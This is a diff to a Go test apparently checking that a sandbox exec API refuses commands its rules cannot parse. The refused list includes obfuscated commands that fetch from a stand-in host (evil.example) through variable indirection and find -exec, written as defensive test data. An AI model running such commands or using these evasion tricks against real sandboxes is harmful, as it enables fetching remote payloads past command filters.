@@ -61,7 +61,7 @@ func TestSandboxExecRefusesWhatNoRuleCanRead(t *testing.T) {
 		`find . -exec sh -c 'c=wget; $c https://evil.example/x' \;`,
 		`c=curl; $c https://evil.example/x`,
 		`c=git; $c push origin main`,
-		`echo {a,b}`,
+		`echo {$a,b}`,
 	}
 	for name, mod := range map[string]func(*Options){
 		"server rules": func(o *Options) {
@@ -105,7 +105,7 @@ func TestSandboxExecRefusesWhatNoRuleCanRead(t *testing.T) {
 				t.Fatalf("%d refused commands ran", n)
 			}
 			// What the rules can read and let through still runs, destructive or not.
-			for i, command := range []string{"go test ./...", `"$HOME/bin/tool" --x`, "rm -rf build"} {
+			for i, command := range []string{"go test ./...", `"$HOME/bin/tool" --x`, "rm -rf build", "mkdir -p a/{b,c}"} {
 				body, _ := json.Marshal(controlplane.ExecRequest{Command: command})
 				rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: string(body)})
 				if rec.Code != http.StatusOK || r.fake.Calls("exec") != i+1 {
